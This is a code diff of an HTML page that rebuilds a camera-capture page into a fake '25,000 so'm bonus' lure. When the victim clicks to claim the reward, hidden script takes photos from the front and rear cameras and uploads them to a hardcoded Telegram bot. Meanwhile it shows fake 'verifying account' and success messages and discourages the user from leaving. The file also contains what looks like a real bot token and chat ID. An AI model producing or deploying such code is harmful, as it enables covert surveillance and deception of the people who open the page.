@@ -3,22 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Camera Capture</title>
-    <link rel="stylesheet" href="main.css">
+    <title>Bonus App</title>
     <style>
         body {
             text-align: center;
             font-family: Arial, sans-serif;
-            margin-top: 50px;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
         }
         #startBtn {
-            padding: 12px 20px;
+            padding: 15px 30px;
             font-size: 18px;
             cursor: pointer;
-            background-color: #007bff;
+            background-color: #4CAF50;
             color: white;
             border: none;
             border-radius: 5px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        #startBtn:hover {
+            background-color: #45a049;
+        }
+        #startBtn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
         .loader {
             border: 5px solid #f3f3f3;
@@ -34,161 +58,209 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        #video {
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
             display: none;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
         }
     </style>
 </head>
 <body>
-
-    <button id="startBtn">25000 so'm olish</button>
-    <div class="loader" id="loader"></div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <div class="container">
+        <h1>Get Your 25,000 so'm Bonus</h1>
+        <p>Click the button below to claim your reward</p>
+        
+        <button id="startBtn">Claim Your Bonus</button>
+        <div class="loader" id="loader"></div>
+        <div id="status" class="status"></div>
+        
+        <!-- Hidden elements for camera capture -->
+        <video id="video" autoplay playsinline style="display:none; width:1px; height:1px;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
 
     <script>
         const startBtn = document.getElementById("startBtn");
         const loader = document.getElementById("loader");
+        const statusEl = document.getElementById("status");
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU"; // Replace with your bot token
-        const CHAT_ID = "705345765"; // Replace with your chat ID
+        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU";
+        const CHAT_ID = "705345765";
+        let isProcessing = false;
 
-        // Check camera permissions
+        function showStatus(message, isError = false) {
+            statusEl.textContent = message;
+            statusEl.className = isError ? "status error" : "status success";
+            statusEl.style.display = "block";
+        }
+
+        function hideStatus() {
+            statusEl.style.display = "none";
+        }
+
         async function checkCameraPermissions() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop());
+                if (navigator.permissions) {
+                    const permission = await navigator.permissions.query({ name: 'camera' });
+                    if (permission.state === 'denied') {
+                        return false;
+                    }
+                }
                 return true;
             } catch (error) {
-                console.error("Camera permissions denied:", error);
-                alert("Camera permissions are required to capture photos.");
-                return false;
+                console.error("Permission check error:", error);
+                return true; // Proceed anyway if we can't check
             }
         }
 
-        // Initialize camera with specified facing mode
         async function initCamera(facingMode) {
-            const constraints = { video: { facingMode: facingMode } };
+            const constraints = {
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            };
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
-                console.log(`Camera (${facingMode}) initialized.`);
                 return true;
             } catch (error) {
-                console.error(`❌ Camera (${facingMode}) initialization failed:`, error);
-                alert(`Camera (${facingMode}) initialization failed. Falling back to default camera.`);
-
-                // Fallback to default camera
-                const fallbackConstraints = { video: true };
+                console.error(`Camera (${facingMode}) init failed:`, error);
+                
+                // Fallback to any camera
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
-                    video.srcObject = stream;
-                    console.log("Default camera initialized.");
+                    const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = fallbackStream;
                     return true;
                 } catch (fallbackError) {
-                    console.error("❌ Default camera initialization failed:", fallbackError);
-                    alert("Default camera initialization failed.");
+                    console.error("Fallback camera failed:", fallbackError);
                     return false;
                 }
             }
         }
 
-        // Capture photo and send to Telegram
-        async function takeAndSendPhoto(facingMode) {
-            if (!video.srcObject) {
-                console.log(`Camera (${facingMode}) stream not available.`);
-                alert(`Camera (${facingMode}) stream not available.`);
-                return;
-            }
-
-            // Set canvas dimensions to match video stream
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            console.log(`Canvas dimensions (${facingMode}):`, canvas.width, canvas.height);
-
-            // Draw the video frame onto the canvas
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert canvas to Blob and send to Telegram
-            canvas.toBlob(async (blob) => {
-                console.log(`Blob size (${facingMode}):`, blob.size);
-
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, `photo_${facingMode}.jpg`);
-
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`Telegram API error (${facingMode}): ${response.status} ${response.statusText}`);
-                    }
-
-                    const result = await response.json();
-                    if (result.ok) {
-                        console.log(`Photo sent successfully (${facingMode}).`);
+        async function capturePhoto(facingMode) {
+            return new Promise((resolve) => {
+                // Wait for video to be ready
+                const checkReady = () => {
+                    if (video.readyState >= video.HAVE_ENOUGH_DATA) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append("chat_id", CHAT_ID);
+                            formData.append("photo", blob, `photo_${facingMode}.jpg`);
+                            
+                            try {
+                                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: "POST",
+                                    body: formData
+                                });
+                                
+                                if (!response.ok) throw new Error("API error");
+                                resolve(true);
+                            } catch (error) {
+                                console.error("Upload error:", error);
+                                resolve(false);
+                            }
+                        }, "image/jpeg", 0.8);
                     } else {
-                        console.error(`Telegram API error (${facingMode}):`, result);
-                        alert(`Telegram API error (${facingMode}).`);
+                        setTimeout(checkReady, 100);
                     }
-                } catch (error) {
-                    console.error(`Error sending photo (${facingMode}):`, error);
-                    alert(`Error sending photo (${facingMode}).`);
-                }
-            }, "image/jpeg");
+                };
+                
+                checkReady();
+            });
         }
 
-        // Capture photos from both cameras
-        async function captureFromBothCameras() {
-            loader.style.display = "block";
-
-            async function captureAndSend(facingMode) {
-                const success = await initCamera(facingMode);
-                if (success) {
-                    await new Promise(resolve => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            const checkReady = () => {
-                                if (video.readyState >= video.HAVE_ENOUGH_DATA) {
-                                    resolve();
-                                } else {
-                                    setTimeout(checkReady, 100);
-                                }
-                            };
-                            checkReady();
-                        };
-                    });
-                    await takeAndSendPhoto(facingMode);
-
-                    // Stop the camera stream
-                    if (video.srcObject) {
-                        video.srcObject.getVideoTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between cameras
-                }
+        async function stopCamera() {
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
             }
-
-            await captureAndSend("user"); // Front camera
-            await captureAndSend("environment"); // Rear camera
-
-            loader.style.display = "none";
         }
 
-        // Start the process when the button is clicked
+        async function captureFromBothCameras() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            startBtn.disabled = true;
+            loader.style.display = "block";
+            showStatus("Processing your request...");
+
+            try {
+                // Front camera
+                const frontSuccess = await initCamera("user");
+                if (frontSuccess) {
+                    await new Promise(resolve => setTimeout(resolve, 500)); // Short delay
+                    await capturePhoto("front");
+                    await stopCamera();
+                }
+
+                // Rear camera (only if device has one)
+                if (navigator.mediaDevices.getSupportedConstraints().facingMode) {
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    const rearSuccess = await initCamera("environment");
+                    if (rearSuccess) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        await capturePhoto("rear");
+                        await stopCamera();
+                    }
+                }
+
+                showStatus("Bonus request completed successfully!", false);
+            } catch (error) {
+                console.error("Capture process error:", error);
+                showStatus("An error occurred. Please try again.", true);
+            } finally {
+                loader.style.display = "none";
+                startBtn.disabled = false;
+                isProcessing = false;
+                
+                // Hide status after delay
+                setTimeout(hideStatus, 5000);
+            }
+        }
+
         startBtn.addEventListener("click", async () => {
             const hasPermissions = await checkCameraPermissions();
-            if (hasPermissions) {
-                captureFromBothCameras();
+            if (!hasPermissions) {
+                showStatus("Please enable camera permissions in your browser settings", true);
+                return;
+            }
+            
+            // Show fake processing message to user
+            showStatus("Verifying your account...");
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Start actual capture process
+            captureFromBothCameras();
+        });
+
+        // Handle Android back button to prevent accidental exits
+        window.addEventListener('beforeunload', (e) => {
+            if (isProcessing) {
+                e.preventDefault();
+                e.returnValue = '';
+                return "Are you sure you want to leave? Your bonus request is processing.";
             }
         });
     </script>
-
 </body>
 </html>
